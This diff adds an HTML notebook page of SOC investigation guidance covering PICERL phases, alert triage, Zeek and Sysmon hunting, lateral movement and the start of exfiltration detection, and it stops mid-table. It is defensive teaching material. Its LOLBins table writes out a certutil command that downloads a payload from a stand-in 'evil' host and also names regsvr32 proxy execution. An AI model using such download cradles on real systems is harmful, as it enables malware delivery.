@@ -1,0 +1,1018 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SOC Investigation Workflow — SOC Notes</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<nav class="navbar">
+  <button id="sb-toggle" class="nav-toggle" onclick="toggleSidebar()" title="Toggle sidebar" aria-label="Toggle sidebar">
+    <svg width="15" height="12" viewBox="0 0 15 12" fill="currentColor">
+      <rect width="15" height="2" rx="1"/>
+      <rect y="5" width="15" height="2" rx="1"/>
+      <rect y="10" width="15" height="2" rx="1"/>
+    </svg>
+  </button>
+  <a href="index.html" class="nav-brand"><span class="icon">⬡</span> SOC Notes</a>
+  <div class="nav-links">
+    <a href="index.html">Home</a>
+    <a href="psaa.html">PSAA</a>
+    <a href="security-onion.html">Security Onion</a>
+    <a href="investigation-flow.html" class="active">Investigation Flow</a>
+    <a href="splunk.html">Splunk</a>
+    <a href="elk.html">ELK Stack</a>
+    <a href="openvas.html">OpenVAS</a>
+    <a href="kali.html">Kali Linux</a>
+    <a href="metasploit.html">Metasploit</a>
+    <a href="yara.html">YARA</a>
+    <a href="zeek.html">Zeek</a>
+    <a href="clamav.html">ClamAV</a>
+    <a href="misp.html">MISP</a>
+    <a href="cuckoo.html">Cuckoo</a>
+    <a href="velociraptor.html">Velociraptor</a>
+    <a href="autopsy.html">Autopsy</a>
+    <a href="anyrun.html">ANY.RUN</a>
+    <a href="nmap.html">Nmap</a>
+    <a href="wireshark.html">Wireshark</a>
+    <a href="snort.html">Snort</a>
+    <a href="ossec.html">OSSEC</a>
+    <a href="log-sources.html">Log Sources</a>
+    <a href="redteam-correlation.html">Red Team Lab</a>
+  </div>
+</nav>
+
+<div class="layout">
+
+  <aside id="sb" class="sidebar">
+    <div class="sidebar-header">
+      <div class="sidebar-label">Notebook</div>
+      <div class="sidebar-title">Investigation Workflow</div>
+    </div>
+  </aside>
+
+  <main id="main" class="main">
+    <div class="content-wrap">
+      <div id="content-area">
+        <div class="welcome">
+          <div class="w-icon">🔍</div>
+          <h2>SOC Investigation Workflow</h2>
+          <p>Select a topic from the sidebar to begin.</p>
+        </div>
+      </div>
+    </div>
+  </main>
+
+</div>
+
+<!-- ══════════════════════════ TOPIC 1: PICERL Overview ══════════════════════════ -->
+<template id="tpl-01-picerl-overview">
+<article class="topic">
+  <h2>01 &middot; PICERL Framework Overview</h2>
+
+  <p>PICERL is the standard incident response lifecycle defined by NIST SP 800-61. Every SOC investigation follows this framework — sometimes linearly, sometimes looping back when new evidence surfaces.</p>
+
+  <div class="callout warn">
+    <strong>PICERL is not always linear.</strong> Containment often loops back to Identification when you discover additional compromised hosts. Eradication may reveal new persistence mechanisms that restart the investigation cycle.
+  </div>
+
+  <h3>The Six Phases</h3>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Phase</th><th>What It Means</th><th>Analyst Actions</th><th>Tools Used</th><th>Documentation Produced</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><strong>P — Preparation</strong></td>
+          <td>Build capability before incidents occur</td>
+          <td>Deploy sensors, write detection rules, build playbooks, train analysts</td>
+          <td>Security Onion, Wazuh, Snort/Suricata, YARA, EDR agents</td>
+          <td>Playbooks, runbooks, escalation matrices, contact lists</td>
+        </tr>
+        <tr>
+          <td><strong>I — Identification</strong></td>
+          <td>Detect and confirm a security event is an incident</td>
+          <td>Triage alerts, validate true positives, determine scope, identify affected systems</td>
+          <td>SIEM (Splunk/ELK), Security Onion Alerts, Hunt queries, VirusTotal</td>
+          <td>Initial incident ticket, alert triage notes, true/false positive determination</td>
+        </tr>
+        <tr>
+          <td><strong>C — Containment</strong></td>
+          <td>Stop the attacker from spreading further</td>
+          <td>Isolate hosts, block IPs, disable accounts, capture forensic evidence before isolation</td>
+          <td>Firewall rules, EDR isolation, Active Response (Wazuh), memory capture (winpmem)</td>
+          <td>Containment actions log, memory dumps, VM snapshots, evidence chain of custody</td>
+        </tr>
+        <tr>
+          <td><strong>E — Eradication</strong></td>
+          <td>Remove the threat completely from the environment</td>
+          <td>Delete malware, remove persistence, reset credentials, patch vulnerabilities</td>
+          <td>ClamAV, YARA scans, registry editors, Group Policy, vulnerability scanners</td>
+          <td>Eradication checklist, IOC removal log, credential reset confirmation</td>
+        </tr>
+        <tr>
+          <td><strong>R — Recovery</strong></td>
+          <td>Restore systems to normal operation safely</td>
+          <td>Restore from backups, rebuild hosts, validate clean state, monitor for re-infection</td>
+          <td>Backup systems, vulnerability scanners, IDS/IPS monitoring, EDR telemetry</td>
+          <td>Recovery validation report, monitoring results, reconnection approval</td>
+        </tr>
+        <tr>
+          <td><strong>L — Lessons Learned</strong></td>
+          <td>Improve defenses based on what happened</td>
+          <td>Conduct post-incident review, update detection rules, improve playbooks</td>
+          <td>Meeting tools, ticketing systems, SIEM rule editors</td>
+          <td>Post-incident report, updated playbooks, new detection rules, training materials</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Common Mistakes by Phase</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Phase</th><th>Common Mistake</th><th>Why It Matters</th></tr></thead>
+      <tbody>
+        <tr><td>Preparation</td><td>No playbooks — analysts improvise during incidents</td><td>Inconsistent response, missed steps, longer MTTR</td></tr>
+        <tr><td>Identification</td><td>Closing alerts as false positive without investigation</td><td>True positives get missed, attacker dwell time increases</td></tr>
+        <tr><td>Containment</td><td>Isolating a host before capturing memory</td><td>Memory-resident malware evidence is lost forever</td></tr>
+        <tr><td>Eradication</td><td>Removing malware but missing persistence mechanisms</td><td>Malware re-deploys after reboot via scheduled tasks or Run keys</td></tr>
+        <tr><td>Recovery</td><td>Reconnecting hosts without monitoring</td><td>Re-infection goes undetected, incident restarts</td></tr>
+        <tr><td>Lessons Learned</td><td>Skipping the post-incident review</td><td>Same gaps persist, same incidents recur</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>The PICERL Loop</h3>
+  <pre><code>Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned
+                    ↑                |
+                    |                ↓
+                    ←── New hosts discovered ──←
+                    ←── New persistence found ──←</code></pre>
+
+  <div class="callout note">
+    <strong>Key insight:</strong> The loop between Identification and Containment is the most common in real incidents. You contain Host A, then discover Host A talked to Host B, which talked to Host C. Each new host restarts the identification process.
+  </div>
+
+</article>
+</template>
+
+<!-- ══════════════════════════ TOPIC 2: Alert Triage ══════════════════════════ -->
+<template id="tpl-02-alert-triage">
+<article class="topic">
+  <h2>02 &middot; Phase 1 — Alert Triage</h2>
+
+  <p>Alert triage is the first action an analyst takes when an alert fires. The goal is to quickly determine: <strong>Is this a true positive that requires investigation, or a false positive that can be closed?</strong></p>
+
+  <h3>Alert Triage Checklist</h3>
+  <div class="callout lab">
+    <strong>Step-by-step analyst workflow — follow in order:</strong>
+  </div>
+
+  <ol>
+    <li><strong>Open the alert</strong> — Note the alert name, severity, timestamp, and count (single event vs. grouped)</li>
+    <li><strong>Identify the source</strong> — Is this Suricata (signature-based), Sigma (log-based), or a Zeek notice?</li>
+    <li><strong>Check source and destination IPs</strong> — Internal-to-external? Internal-to-internal? Known bad IP?</li>
+    <li><strong>Check Community ID</strong> — Use this to correlate the alert to the full network flow across all Zeek datasets</li>
+    <li><strong>Determine alert type</strong>:
+      <ul>
+        <li><strong>Suricata</strong>: Signature match on packet content — check the rule SID and payload</li>
+        <li><strong>Sigma</strong>: Log pattern match — check the Windows Event ID or Sysmon event</li>
+        <li><strong>Zeek Notice</strong>: Behavioral detection — check the notice type and sub-message</li>
+      </ul>
+    </li>
+    <li><strong>Evaluate true positive vs false positive</strong>:
+      <ul>
+        <li>Does the traffic pattern match known malicious behavior?</li>
+        <li>Is the destination IP/domain known bad? (Check VirusTotal, AbuseIPDB)</li>
+        <li>Is the source host expected to make this type of connection?</li>
+        <li>Is this a known-good pattern? (e.g., Windows Update, Office telemetry)</li>
+      </ul>
+    </li>
+    <li><strong>Document your initial finding</strong>:
+      <ul>
+        <li>Timestamp of alert</li>
+        <li>Alert name and source (Suricata/Sigma/Zeek)</li>
+        <li>Source IP → Destination IP : Port</li>
+        <li>Severity level</li>
+        <li>Initial verdict: True Positive / False Positive / Needs Investigation</li>
+      </ul>
+    </li>
+    <li><strong>Ask the key question:</strong> "Is this the first alert, or part of a pattern?"
+      <ul>
+        <li>Search for the source IP across all alerts in the last 24 hours</li>
+        <li>Search for the destination IP/domain — has it triggered other alerts?</li>
+        <li>Check if multiple hosts are affected</li>
+      </ul>
+    </li>
+  </ol>
+
+  <h3>Hunt Pivot — From Alert to Full Dataset View</h3>
+  <pre><code><span class="cm"># In Security Onion Hunt, pivot from alert to all related traffic:</span>
+
+<span class="cm"># All events for the source IP</span>
+source.ip: "10.0.7.14" OR destination.ip: "10.0.7.14"
+
+<span class="cm"># All events matching a specific Community ID</span>
+network.community_id: "1:abc123def456..."
+
+<span class="cm"># All alerts for this IP in the last 24h</span>
+event.module: "suricata" AND source.ip: "10.0.7.14"
+
+<span class="cm"># All Zeek datasets for this IP</span>
+event.module: "zeek" AND (source.ip: "10.0.7.14" OR destination.ip: "10.0.7.14")</code></pre>
+
+  <h3>True Positive vs False Positive Decision Matrix</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Indicator</th><th>Likely True Positive</th><th>Likely False Positive</th></tr></thead>
+      <tbody>
+        <tr><td>Destination IP</td><td>Known C2, no legitimate purpose, recently registered domain</td><td>CDN, cloud provider, known SaaS service</td></tr>
+        <tr><td>Traffic pattern</td><td>Regular beaconing interval, unusual port, encrypted to non-standard port</td><td>Scheduled update check, health monitoring</td></tr>
+        <tr><td>Source host</td><td>Workstation connecting to external IP on port 443 with unusual SNI</td><td>Server performing expected API calls</td></tr>
+        <tr><td>Alert frequency</td><td>Repeated alerts, escalating severity</td><td>Single alert, known noisy rule</td></tr>
+        <tr><td>User agent</td><td>Missing, generic ("Mozilla/5.0"), or known malware UA</td><td>Legitimate browser or application UA string</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+</article>
+</template>
+
+<!-- ══════════════════════════ TOPIC 3: Network Investigation ══════════════════════════ -->
+<template id="tpl-03-network-investigation">
+<article class="topic">
+  <h2>03 &middot; Phase 2 — Network Investigation</h2>
+
+  <p>After confirming a true positive alert, investigate the full network evidence. Each Zeek dataset tells a different part of the story.</p>
+
+  <h3>zeek.conn — Connection Logs</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Field</th><th>What to Look For</th><th>Malicious Indicator</th><th>Benign Indicator</th></tr></thead>
+      <tbody>
+        <tr><td><code>id.resp_p</code></td><td>Destination port</td><td>Unusual ports (4444, 8080, 9001), non-standard HTTPS ports</td><td>80, 443, 53, 22 to expected destinations</td></tr>
+        <tr><td><code>orig_bytes</code> / <code>resp_bytes</code></td><td>Data volume</td><td>Large outbound transfers, asymmetric ratio (exfiltration)</td><td>Balanced request/response typical of web browsing</td></tr>
+        <tr><td><code>duration</code></td><td>Connection length</td><td>Very long sessions (hours), persistent C2 channels</td><td>Short web requests, API calls</td></tr>
+        <tr><td><code>conn_state</code></td><td>TCP state</td><td>S0 (SYN only, no reply) = port scan; OTH = unusual</td><td>SF (normal close), S1 (established)</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <pre><code><span class="cm"># Hunt: Beaconing detection — regular interval connections</span>
+event.dataset: "zeek.conn" AND destination.ip: "198.51.100.23" | sort @timestamp</code></pre>
+
+  <h3>zeek.dns — DNS Logs</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Field</th><th>What to Look For</th><th>Malicious Indicator</th><th>Benign Indicator</th></tr></thead>
+      <tbody>
+        <tr><td><code>query</code></td><td>Domain queried</td><td>Long encoded subdomains (tunneling), recently registered domains, DGA patterns</td><td>Known CDNs, corporate domains</td></tr>
+        <tr><td><code>rcode_name</code></td><td>Response code</td><td>NXDOMAIN storms (DGA), SERVFAIL to specific domains</td><td>NOERROR with valid answers</td></tr>
+        <tr><td><code>qtype_name</code></td><td>Query type</td><td>TXT records (tunneling), ANY queries (recon)</td><td>A, AAAA, CNAME, MX</td></tr>
+        <tr><td>Query frequency</td><td>Rate of queries</td><td>High-frequency queries to single domain (beaconing)</td><td>Normal browsing patterns</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <pre><code><span class="cm"># Hunt: DNS tunneling — unusually long queries</span>
+event.dataset: "zeek.dns" AND source.ip: "10.0.7.14" AND NOT dns.question.name: *.microsoft.com
+
+<span class="cm"># Hunt: NXDOMAIN storm (possible DGA)</span>
+event.dataset: "zeek.dns" AND dns.response_code: "NXDOMAIN" AND source.ip: "10.0.7.14"</code></pre>
+
+  <h3>zeek.http — HTTP Logs</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Field</th><th>What to Look For</th><th>Malicious Indicator</th><th>Benign Indicator</th></tr></thead>
+      <tbody>
+        <tr><td><code>user_agent</code></td><td>Client identifier</td><td>Missing, generic "Mozilla/5.0" only, known malware UA</td><td>Full browser UA with version, OS details</td></tr>
+        <tr><td><code>host</code></td><td>HTTP Host header</td><td>Dotted-quad IP (no domain), suspicious domain</td><td>Known legitimate domains</td></tr>
+        <tr><td><code>uri</code></td><td>Request path</td><td>/gate.php, /beacon, encoded paths, single-char paths</td><td>Normal web paths, API endpoints</td></tr>
+        <tr><td><code>method</code></td><td>HTTP method</td><td>POST with large body to unknown host (exfiltration)</td><td>GET for page loads, POST to known APIs</td></tr>
+        <tr><td><code>referrer</code></td><td>Referring page</td><td>Missing on direct navigation to suspicious URL</td><td>Present from normal browsing flow</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <pre><code><span class="cm"># Hunt: HTTP to dotted-quad IP (no domain = suspicious)</span>
+event.dataset: "zeek.http" AND NOT url.domain: *.*
+
+<span class="cm"># Hunt: Suspicious user agent</span>
+event.dataset: "zeek.http" AND source.ip: "10.0.7.14" | fields user_agent.original</code></pre>
+
+  <h3>zeek.files — File Transfer Logs</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Field</th><th>What to Look For</th><th>Malicious Indicator</th><th>Benign Indicator</th></tr></thead>
+      <tbody>
+        <tr><td><code>mime_type</code></td><td>File type</td><td>application/x-dosexec over HTTP, MIME mismatch (PDF header but .exe extension)</td><td>text/html, image/png from web browsing</td></tr>
+        <tr><td><code>md5</code> / <code>sha256</code></td><td>File hash</td><td>Known malware hash on VirusTotal</td><td>Known-good hash, 0 detections</td></tr>
+        <tr><td><code>missing_bytes</code></td><td>Capture completeness</td><td>0 = hash is reliable; &gt;0 = partial capture, hash may not match</td><td>0 for complete files</td></tr>
+        <tr><td><code>fuid</code></td><td>File unique ID</td><td>Use to correlate with zeek.conn and PCAP</td><td>Standard correlation field</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <pre><code><span class="cm"># Hunt: All file transfers with hashes for a specific IP</span>
+event.dataset: "zeek.files" AND (source.ip: "10.0.7.14" OR destination.ip: "10.0.7.14")</code></pre>
+
+  <h3>zeek.ssl — TLS/SSL Logs</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Field</th><th>What to Look For</th><th>Malicious Indicator</th></tr></thead>
+      <tbody>
+        <tr><td><code>server_name</code> (SNI)</td><td>Requested hostname</td><td>Unusual SNI, mismatch with cert subject, known C2 domain</td></tr>
+        <tr><td><code>ja3</code></td><td>TLS client fingerprint</td><td>Known malware JA3 hash (check ja3er.com)</td></tr>
+        <tr><td><code>validation_status</code></td><td>Certificate validation</td><td>Self-signed, expired, unable to validate chain</td></tr>
+        <tr><td><code>subject</code></td><td>Certificate subject</td><td>Generic subjects, Let's Encrypt on suspicious domain, mismatched CN</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>zeek.rdp — Remote Desktop Logs</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Field</th><th>What to Look For</th><th>Malicious Indicator</th></tr></thead>
+      <tbody>
+        <tr><td><code>security_protocol</code></td><td>RDP security type</td><td>HYBRID_EX = standard modern; TLS only without NLA = weaker</td></tr>
+        <tr><td><code>cookie</code></td><td>RDP cookie field</td><td>Reveals domain name and username used for authentication</td></tr>
+        <tr><td>Internal-to-internal</td><td>Direction</td><td>RDP between workstations = unusual; server-to-server = lateral movement</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>zeek.smb_files — SMB File Access Logs</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Field</th><th>What to Look For</th><th>Malicious Indicator</th></tr></thead>
+      <tbody>
+        <tr><td><code>action</code></td><td>File operation</td><td>SMB::FILE_OPEN on .exe from remote share = lateral movement tool staging</td></tr>
+        <tr><td><code>name</code></td><td>File path</td><td>Executable files accessed: psexec.exe, mimikatz.exe, *.ps1 scripts</td></tr>
+        <tr><td><code>path</code></td><td>Share path</td><td>\\hostname\C$\ or \\hostname\ADMIN$ = admin share access</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>zeek.ftp — FTP Logs</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Field</th><th>What to Look For</th><th>Malicious Indicator</th></tr></thead>
+      <tbody>
+        <tr><td><code>user</code></td><td>FTP username</td><td>Cleartext credentials — note for credential compromise assessment</td></tr>
+        <tr><td><code>command</code></td><td>FTP command</td><td>STOR (upload/exfiltration), RETR (download)</td></tr>
+        <tr><td><code>data_channel.is_orig</code></td><td>Data direction</td><td>true = data originated from internal host (outbound exfiltration)</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>zeek.kerberos — Kerberos Authentication Logs</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Field</th><th>What to Look For</th><th>Malicious Indicator</th></tr></thead>
+      <tbody>
+        <tr><td><code>error_msg</code></td><td>Authentication result</td><td>Multiple KDC_ERR_PREAUTH_FAILED = brute force attack</td></tr>
+        <tr><td><code>request_type</code></td><td>Ticket type</td><td>AS-REQ success = TGT obtained; TGS-REQ = service ticket requested</td></tr>
+        <tr><td><code>service</code></td><td>Target service</td><td>TERMSRV = RDP target; CIFS = SMB target; krbtgt = Golden Ticket risk</td></tr>
+        <tr><td><code>cipher</code></td><td>Encryption type</td><td>aes256-cts-hmac-sha1-96 = modern domain; RC4 = downgrade attack</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>zeek.ldap_search — LDAP Enumeration Logs</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Field</th><th>What to Look For</th><th>Malicious Indicator</th></tr></thead>
+      <tbody>
+        <tr><td><code>filter</code></td><td>LDAP search filter</td><td>Broad filters enumerating all users, computers, or groups</td></tr>
+        <tr><td><code>base_object</code></td><td>Search base DN</td><td>Domain root = full domain enumeration</td></tr>
+        <tr><td>Domain SID exposure</td><td>SID in results</td><td>Domain SID obtained = Golden Ticket prerequisite (need SID + krbtgt hash)</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+</article>
+</template>
+
+<!-- ══════════════════════════ TOPIC 4: Host Investigation ══════════════════════════ -->
+<template id="tpl-04-host-investigation">
+<article class="topic">
+  <h2>04 &middot; Phase 3 — Host Investigation</h2>
+
+  <p>After network evidence confirms a compromised host, pivot to Sysmon and Windows Event Log data to understand what the attacker did on the endpoint.</p>
+
+  <h3>Sysmon Event IDs — Investigation Reference</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>EID</th><th>Event</th><th>Investigation Use</th><th>Key Fields</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><strong>1</strong></td>
+          <td>Process Creation</td>
+          <td>Full process chain — what ran, who ran it, parent process, command line args, file hash</td>
+          <td><code>Image, CommandLine, ParentImage, ParentCommandLine, Hashes, IntegrityLevel, User</code></td>
+        </tr>
+        <tr>
+          <td><strong>3</strong></td>
+          <td>Network Connection</td>
+          <td>Which process made a network connection — ties process to C2 traffic</td>
+          <td><code>Image, DestinationIp, DestinationPort, Protocol, User</code></td>
+        </tr>
+        <tr>
+          <td><strong>8</strong></td>
+          <td>CreateRemoteThread</td>
+          <td>Process injection — one process injecting code into another</td>
+          <td><code>SourceImage, TargetImage, StartAddress, StartFunction</code></td>
+        </tr>
+        <tr>
+          <td><strong>10</strong></td>
+          <td>ProcessAccess</td>
+          <td>LSASS access = credential theft (Mimikatz, procdump targeting lsass.exe)</td>
+          <td><code>SourceImage, TargetImage, GrantedAccess</code></td>
+        </tr>
+        <tr>
+          <td><strong>11</strong></td>
+          <td>FileCreate</td>
+          <td>File drops — unusual write locations, executable drops, staging directories</td>
+          <td><code>Image, TargetFilename, CreationUtcTime</code></td>
+        </tr>
+        <tr>
+          <td><strong>12/13</strong></td>
+          <td>RegistryEvent</td>
+          <td>Persistence via Run keys, services, COM objects</td>
+          <td><code>Image, EventType, TargetObject, Details</code></td>
+        </tr>
+        <tr>
+          <td><strong>22</strong></td>
+          <td>DNSEvent</td>
+          <td>Which process made a DNS query — ties process to domain resolution</td>
+          <td><code>Image, QueryName, QueryResults</code></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Process Validation Framework — Three Checks</h3>
+  <div class="callout lab">
+    <strong>For every suspicious process, run all three checks before clearing it:</strong>
+  </div>
+
+  <h4>Check 1: Path Validation</h4>
+  <p>Is the executable running from the expected location?</p>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Process</th><th>Expected Path</th><th>Suspicious If Found In</th></tr></thead>
+      <tbody>
+        <tr><td>svchost.exe</td><td>C:\Windows\System32\</td><td>C:\Users\, C:\Temp\, C:\ProgramData\</td></tr>
+        <tr><td>explorer.exe</td><td>C:\Windows\</td><td>Any other location</td></tr>
+        <tr><td>lsass.exe</td><td>C:\Windows\System32\</td><td>Any other location = critical alert</td></tr>
+        <tr><td>csrss.exe</td><td>C:\Windows\System32\</td><td>Any other location = name masquerading</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h4>Check 2: Parent Process Validation</h4>
+  <p>Is the parent process what you would expect?</p>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Process</th><th>Expected Parent</th><th>Suspicious Parent</th></tr></thead>
+      <tbody>
+        <tr><td>svchost.exe</td><td>services.exe</td><td>cmd.exe, powershell.exe, explorer.exe</td></tr>
+        <tr><td>lsass.exe</td><td>wininit.exe</td><td>Anything else = critical</td></tr>
+        <tr><td>cmd.exe</td><td>explorer.exe (user), services.exe (service)</td><td>winword.exe, excel.exe = macro execution</td></tr>
+        <tr><td>powershell.exe</td><td>explorer.exe (user), svchost.exe (task)</td><td>mshta.exe, wscript.exe = LOLBin chain</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h4>Check 3: Hash Verification</h4>
+  <pre><code><span class="cm"># Extract MD5 and SHA256 from Sysmon EID 1 Hashes field</span>
+<span class="cm"># Search both on VirusTotal</span>
+<span class="cm"># Check Winbindex (winbindex.m417z.com) for known-good Windows binaries</span>
+<span class="cm"># If hash matches known-good → legitimate</span>
+<span class="cm"># If hash has VT detections → investigate further</span>
+<span class="cm"># If hash is unknown (0 results) → suspicious, needs deeper analysis</span></code></pre>
+
+  <h3>LOLBins to Watch</h3>
+  <p>Living-off-the-Land Binaries — legitimate Windows tools abused by attackers. Always check the <strong>command line arguments</strong>.</p>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Binary</th><th>Legitimate Use</th><th>Malicious Use</th></tr></thead>
+      <tbody>
+        <tr><td><code>rundll32.exe</code></td><td>Run DLL functions</td><td>Execute malicious DLLs, bypass application whitelisting</td></tr>
+        <tr><td><code>mshta.exe</code></td><td>Run HTML applications</td><td>Download and execute payloads via HTA files</td></tr>
+        <tr><td><code>regsvr32.exe</code></td><td>Register COM DLLs</td><td>Proxy execution via /s /u /i:url scrobj.dll</td></tr>
+        <tr><td><code>certutil.exe</code></td><td>Certificate management</td><td>Download files: certutil -urlcache -split -f http://evil/payload.exe</td></tr>
+        <tr><td><code>wscript.exe</code></td><td>Run VBScript/JScript</td><td>Execute malicious scripts dropped by phishing</td></tr>
+        <tr><td><code>powershell.exe</code></td><td>System administration</td><td>Encoded commands, download cradles, AMSI bypass</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Common False Positives — Know These to Save Time</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Process Chain</th><th>Why It Fires</th><th>Verdict</th></tr></thead>
+      <tbody>
+        <tr><td>SDXHelper.exe /onlogon via Task Scheduler</td><td>Microsoft Office update check on user logon</td><td>False positive — legitimate Office behavior</td></tr>
+        <tr><td>DismHost.exe spawned by cleanmgr.exe</td><td>Windows Disk Cleanup invokes DISM for component cleanup</td><td>False positive — legitimate Windows maintenance</td></tr>
+        <tr><td>rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh</td><td>Windows AppX service refreshing shell extensions</td><td>False positive — legitimate AppX operation</td></tr>
+        <tr><td>svchost.exe -k DcomLaunch → COM activation</td><td>Windows COM subsystem activating a COM object</td><td>False positive — legitimate DCOM service</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+</article>
+</template>
+
+<!-- ══════════════════════════ TOPIC 5: Lateral Movement ══════════════════════════ -->
+<template id="tpl-05-lateral-movement">
+<article class="topic">
+  <h2>05 &middot; Phase 4 — Lateral Movement Detection</h2>
+
+  <p>Once an attacker compromises one host, they move laterally to access additional systems. Detecting and tracing this movement is critical for understanding the full scope of compromise.</p>
+
+  <h3>RDP Lateral Movement Indicators</h3>
+
+  <h4>Network Evidence (Zeek)</h4>
+  <ul>
+    <li><strong>zeek.rdp</strong> sessions between two internal hosts — workstation-to-workstation RDP is almost always suspicious</li>
+    <li><strong>security_protocol: HYBRID_EX</strong> — standard modern RDP with NLA (Network Level Authentication)</li>
+    <li><strong>cookie field</strong> — reveals the domain name and username used for authentication</li>
+  </ul>
+  <pre><code><span class="cm"># Hunt: RDP between internal hosts</span>
+event.dataset: "zeek.rdp" AND source.ip: 10.0.0.0/8 AND destination.ip: 10.0.0.0/8</code></pre>
+
+  <h4>Host Evidence (Sysmon)</h4>
+  <ul>
+    <li><strong>Source host</strong>: Sysmon EID 1 — <code>mstsc.exe</code> process creation with destination IP in command line</li>
+    <li><strong>Destination host</strong>: Look for <code>rdpclip.exe</code>, <code>rdpinput.exe</code>, <code>TSTheme.exe</code> spawning — these only appear when an active RDP session connects</li>
+    <li>If these processes spawn on a server that shouldn't receive RDP from that source = confirmed lateral movement</li>
+  </ul>
+
+  <h3>SMB Lateral Movement Indicators</h3>
+  <ul>
+    <li><strong>zeek.smb_files</strong> — executable access between internal hosts is almost always malicious</li>
+    <li><strong>SMB::FILE_OPEN</strong> on .exe files from share paths — attacker staging tools</li>
+    <li><strong>\\hostname\C$\</strong> or <strong>\\hostname\ADMIN$\</strong> — admin share access requires domain admin or local admin credentials</li>
+  </ul>
+  <pre><code><span class="cm"># Hunt: SMB executable access between internal hosts</span>
+event.dataset: "zeek.smb_files" AND file.name: *.exe
+
+<span class="cm"># Hunt: Admin share access</span>
+event.dataset: "zeek.smb_files" AND file.path: *ADMIN$*</code></pre>
+
+  <h3>Kerberos Attack Chain</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Event</th><th>Kerberos Field</th><th>What It Means</th><th>Attack Stage</th></tr></thead>
+      <tbody>
+        <tr><td>Multiple KDC_ERR_PREAUTH_FAILED</td><td><code>error_msg</code></td><td>Password guessing against AD accounts</td><td>Credential access — brute force</td></tr>
+        <tr><td>AS-REQ success</td><td><code>request_type: AS</code></td><td>TGT obtained — attacker authenticated to domain</td><td>Initial authentication</td></tr>
+        <tr><td>TGS-REQ for TERMSRV</td><td><code>service: TERMSRV/hostname</code></td><td>Service ticket for RDP to specific host</td><td>Lateral movement via RDP</td></tr>
+        <tr><td>TGS-REQ for CIFS</td><td><code>service: CIFS/hostname</code></td><td>Service ticket for SMB to specific host</td><td>Lateral movement via SMB</td></tr>
+        <tr><td>Encryption: RC4</td><td><code>cipher: rc4-hmac</code></td><td>Weak encryption — possible downgrade attack or pass-the-hash</td><td>Credential theft</td></tr>
+        <tr><td>Domain SID via LDAP</td><td>LDAP search results</td><td>Domain SID obtained — prerequisite for Golden Ticket</td><td>Persistence setup</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Compromised Host Tracking</h3>
+  <div class="callout note">
+    <strong>Pivot method:</strong> Source IP → Destination IP → Check destination for C2 beaconing. Repeat until no new hosts are found.
+  </div>
+
+  <p>Maintain a running list as you investigate:</p>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Host</th><th>IP</th><th>Confirmed C2?</th><th>Lateral Movement To</th><th>Evidence</th></tr></thead>
+      <tbody>
+        <tr><td>WORKSTATION-7</td><td>10.0.7.14</td><td>Yes — HTTP beaconing to 198.51.100.23</td><td>DC01, FILESERVER</td><td>zeek.conn, zeek.http</td></tr>
+        <tr><td>DC01</td><td>10.0.1.1</td><td>Check pending</td><td>—</td><td>zeek.rdp from 10.0.7.14</td></tr>
+        <tr><td>FILESERVER</td><td>10.0.1.20</td><td>Check pending</td><td>—</td><td>zeek.smb_files from 10.0.7.14</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+</article>
+</template>
+
+<!-- ══════════════════════════ TOPIC 6: Exfiltration Detection ══════════════════════════ -->
+<template id="tpl-06-exfiltration-detection">
+<article class="topic">
+  <h2>06 &middot; Phase 5 — Exfiltration Detection</h2>
+
+  <p>Exfiltration is the attacker's endgame — getting data out. Detecting confirmed exfiltration changes the incident severity and drives containment urgency.</p>
+
+  <h3>FTP Exfiltration Indicators</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Field</th><th>Value</th><th>Meaning</th></tr></thead>
+      <tbody>
